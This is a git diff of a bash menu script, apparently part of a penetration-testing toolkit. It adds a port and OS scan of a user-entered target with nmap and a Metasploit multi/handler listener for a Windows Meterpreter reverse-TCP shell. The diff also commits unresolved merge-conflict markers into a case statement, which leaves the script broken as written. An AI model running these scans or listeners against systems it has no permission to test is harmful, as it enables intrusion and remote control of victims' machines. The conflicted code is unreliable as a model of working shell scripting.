@@ -55,6 +55,7 @@ show_ip_addresses() {
 execute_option() {
     case $1 in
         1)
+<<<<<<< HEAD
             read -p "Enter The Target Ip Or Link : " IP
             sudo nmap -sS -O -Pn -sV -p- $IP
             echo
@@ -100,14 +101,34 @@ execute_option() {
             xterm -fa monaco -fs 13 -bg black -e "
                
                 echo
+=======
+            xterm -hold -e "
+               
+                echo '========================================================================='
+                echo 'IPv4 and IPv6 Addresses'
+                echo '========================================================================='
+                echo 'IPv4 Addresses:'
+                ip -4 addr show | grep inet | awk '{print \$2}'
+                echo ''
+                echo 'IPv6 Addresses:'
+                ip -6 addr show | grep inet6 | awk '{print \$2}'
+                echo '========================================================================='
+
+               
+>>>>>>> origin/main
                 echo 'Enter LHOST (IP address for Metasploit):'
                 read LHOST
                 echo 'Enter LPORT (Port for Metasploit):'
                 read LPORT
                 echo 'Starting Metasploit With Listener...'
 
+<<<<<<< HEAD
                
                 msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST \$LHOST; set LPORT \$LPORT; exploit\"
+=======
+                
+                msfconsole -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST \$LHOST; set LPORT \$LPORT; exploit\"
+>>>>>>> origin/main
             " &
             ;;
         4)
